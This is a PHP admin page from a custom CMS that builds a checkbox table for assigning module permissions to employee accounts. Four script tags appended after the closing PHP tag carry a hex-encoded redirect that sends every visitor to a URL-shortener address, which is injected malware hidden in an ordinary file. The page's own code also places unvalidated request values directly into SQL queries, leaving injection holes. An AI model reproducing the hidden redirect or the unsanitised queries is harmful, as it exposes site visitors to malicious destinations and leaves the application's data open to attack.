<?php

require_once('helper.php');

$msg        =  isset($_GET['msg']) ? $_GET['msg'] : '';

$id = base64_decode($_GET['id']);

$did = base64_decode($_GET['did']);

class myCms extends Cms 

{

    function registerAjaxFunctions()

    {

        $this->xajax->registerFunction("get_Listing");

        $this->xajax->registerFunction("update_status");

        $this->xajax->registerFunction("deleteRow");

        $this->xajax->registerFunction("editMode");

        $this->xajax->registerFunction("sorting");

        $this->xajax->registerFunction("sortTitle");

    }

}

$objMisc = new myCms();

$objMisc->initializeAjax(false,true);

$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;

$objMisc->rec_pp = 20;

$objMisc->dbFunc->ajax_pagin = true;

//print_r($_SESSION['pass1']);

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){

    $arrMods="";    

    if(!empty($_POST['checkper']))  

    $permission = serialize($_POST['checkper']);

    $row = array('MODULE_PERMISSIONS'=>$permission);
    $where = "USER_ID = ".$_POST['employee_id']." AND USER_TYPE='E'";
    $val = $objMisc->update("users",$row,$where);

    $_SESSION['msg'] = 1;

    header("location:permission.php?id=".$_GET['id']);

    exit; 

}

//print_r($_SESSION['pass']);

if($id){

    $where = "1=1 and HEADOFFICE_ID = ".$_SESSION['HEADOFFICE']." and USER_ID = ".$id." AND USER_TYPE='E'";

    $permissions   = $objMisc->GiveValue($where,"MODULE_PERMISSIONS","users");

    $permissions   = unserialize($permissions);

}


$k=0;

$where  =   "1=1 and STATUS = 'A' AND PARENT='0'";

$modules = $objMisc->getAllRecords('*','modulemaster',$where);


            

if(in_array('12_V',$_SESSION['pass']) || $_SESSION['USER_TYPE']=='A'){
    if($modules){
        foreach($modules as $row){
            $k++;
            //print_r($permissions);exit;
            //if(in_array($row['id'].'_V',$_SESSION['pass'])){
                $permission_recs .='<tr style="background:#4993d7;">';
                    $num=$objMisc->GiveValue(" PARENT='$row[id]'",'count(*)','modulemaster');
                    $permission_recs .='<td width="30%"><input type="checkbox" name="checkper[]" class="arrgruop '.$k.'arraygroup-0" value="'.$k.'-'.($num+1).'" id="'.$row['id'].'_arrgruop"';
                    if(in_array($k.'-'.($num+1),$permissions))
                        $checked = "checked=checked";
                    else
                        $checked = "";
                    $permission_recs .=$checked.'/>';
                    $permission_recs .='<strong style="color:#fff;">'.$row['name'].'</strong></td>';
                    $arr=explode(',',$row['permission']);
                    $ch='V';
                    if(in_array('V',$arr)!=''){
                        $permission_recs .='<td width="10%"><input type="hidden" id="num'.$row['id'].'" value="'.($num+1).'">
                                                <input type="hidden" id="k'.$row['id'].'" value="'.$k.'">
                                                <input type="checkbox" class="'.$k.'arraygroup-0 '.$k.'arrgroup-V0" name="checkper[]" id="'.$row['id'].'_V" value="'.$row['id'].'_V" onclick="check_col('.$row['id'].',\'V\');"'; 
                        if(in_array($row['id'].'_V',$permissions)) 
                            $checked = "checked=checked";
                        else
                            $checked = ""; 
                        $permission_recs .=$checked.'/></td>';
                    }
                    if(in_array('A',$arr)!=''){
                        $permission_recs .='<td width="10%"><input type="checkbox" class="'.$k.'arraygroup-0 '.$k.'arrgroup-A0" name="checkper[]" id="'.$row['id'].'_A" value="'.$row['id'].'_A" onclick="check_col('.$row['id'].',\'A\');"';                               
                        if(in_array($row['id'].'_A',$permissions))
                            $checked = "checked=checked";
                        else
                            $checked = "";
                        $permission_recs .=$checked.'/></td>';
                    }
                    if(in_array('E',$arr)!=''){

                        $permission_recs .='<td width="10%"><input type="checkbox" class="'.$k.'arraygroup-0 '.$k.'arrgroup-E0" name="checkper[]" id="'.$row['id'].'_E" value="'.$row['id'].'_E" onclick="check_col('.$row['id'].',\'E\');"'; 



                        if(in_array($row['id'].'_E',$permissions)) 

                        $checked = "checked=checked";

                        else



                        $checked = ""; 



                        $permission_recs .=$checked.'/></td>';

                    }
                    if(in_array('D',$arr)!=''){

                        $permission_recs .='<td width="10%">';

                        $permission_recs .='<input type="checkbox" name="checkper[]" class="'.$k.'arraygroup-0 '.$k.'arrgroup-D0" id="'.$row['id'].'_D" value="'.$row['id'].'_D" onclick="check_col('.$row['id'].',\'D\');"';



                        if(in_array($row['id'].'_D',$permissions))

                        $checked = "checked=checked";

                        else



                        $checked = "";



                        $permission_recs .= $checked.'/></td>';

                    }
                    if(in_array('AD',$arr)!=''){

                        $permission_recs .='<td width="20%"><input type="checkbox" class="'.$k.'arraygroup-0 '.$k.'arrgroup-AD0" name="checkper[]" id="'.$row['id'].'_AD" value="'.$row['id'].'_AD" onclick="check_col('.$row['id'].',\'AD\');"';



                        if(in_array($row['id'].'_AD',$permissions))

                        $checked = "checked=checked";

                        else



                        $checked = "";

                        $permission_recs .=$checked.'/></td>';

                    }

                $permission_recs .='</tr>';
                $t=0;
                $where_sub  =   "1=1 and STATUS = 'A' AND PARENT='$row[id]'";
                $sub_modul = $objMisc->getAllRecords('*','modulemaster',$where_sub);
                foreach($sub_modul as $sub_module){
                    $t++;

                    if(in_array($sub_module['id'].'_V',$_SESSION['pass'])){

                        $permission_recs .='<tr>';

                        $num=$t;

                        $permission_recs .='<td width="30%"><input type="checkbox" name="checkper[]" class="arrgruop '.$k.'arraygroup-'.$t.'" value="'.$k.'-'.$num.'" id="'.$sub_module['id'].'_arrgruop"';

                        if(in_array($k.'-'.($t),$permissions))

                        $checked = "checked=checked";

                        else

                        $checked = "";

                        $permission_recs .=$checked.'/>';



                        $permission_recs .='<strong>'.$sub_module['name'].'</strong></td>';

                        $permission_recs .='<td width="10%"><input type="hidden" id="num'.$sub_module['id'].'" value="'.($num+1).'"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_V" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-V'.$t.'" value="'.$sub_module['id'].'_V"'; 



                        if(in_array($sub_module['id'].'_V',$permissions)) 

                        $checked = "checked=checked";

                        else



                        $checked = ""; 



                        $permission_recs .=$checked.'/></td>';

                        $permission_recs .='<td width="10%"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_A" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-A'.$t.'" value="'.$sub_module['id'].'_A"';



                        if(in_array($sub_module['id'].'_A',$permissions))

                        $checked = "checked=checked";

                        else



                        $checked = "";



                        $permission_recs .=$checked.'/></td>';



                        $permission_recs .='<td width="10%"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_E" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-E'.$t.'" value="'.$sub_module['id'].'_E"'; 



                        if(in_array($sub_module['id'].'_E',$permissions)) 

                        $checked = "checked=checked";

                        else



                        $checked = ""; 



                        $permission_recs .=$checked.'/></td>';

                        $permission_recs .='<td width="10%">';

                        $permission_recs .='<input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_D" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-D'.$t.'" value="'.$sub_module['id'].'_D"';



                        if(in_array($sub_module['id'].'_D',$permissions))

                        $checked = "checked=checked";

                        else



                        $checked = "";



                        $permission_recs .= $checked.'/></td>';

                        $permission_recs .='<td width="20%"><input type="checkbox" name="checkper[]" id="'.$sub_module['id'].'_AD" class="'.$k.'arraygroup-'.$t.' '.$k.'arrgroup-AD'.$t.'" value="'.$sub_module['id'].'_AD"';



                        if(in_array($sub_module['id'].'_AD',$permissions))

                        $checked = "checked=checked";

                        else



                        $checked = "";

                        $permission_recs .=$checked.'/></td>';

                        $permission_recs .='</tr>';

                    }
                }
                $permission_recs .='<tr><td colspan="6">&nbsp;</td></tr>';

            //}

        } 

    }

}else{
    header('location:dashboard.php');exit;
}
    

$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;

unset($_SESSION['msg']);

switch ($msg)

{

    case 1:

        $msg = "Permission Set Successfully";

    break;

}



$pageheading = "Set Permission Level"; 

$whereEmp    =   " 1 = 1 AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and E.STATUS = 'A' order by E.NAME ASC";
$staffArray  =   $objMisc->myFunc->fnWriteOptionListWithJoin($id,"NAME,USER_ID,","SELECT U.`USER_ID`,E.`NAME` FROM `employees` E JOIN `users` U ON E.`EMPLOYEE_ID`=U.`ID` AND U.`USER_TYPE`='E' WHERE $whereEmp",0,0); 

$smartyVars['permission_recs']      = $permission_recs;

$smartyVars['staffArray']           = $staffArray;

$smartyVars['rowRec']               = $rowArray;

$smartyVars['recArray']             = $recArray;

$smartyVars['pageheading']          = $pageheading;

$smartyVars['groupData']            = $pagin_recs;

$smartyVars['msg']                  = $msg;

$objMisc->displayPage("header,permission,footer",$smartyVars);

          

?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>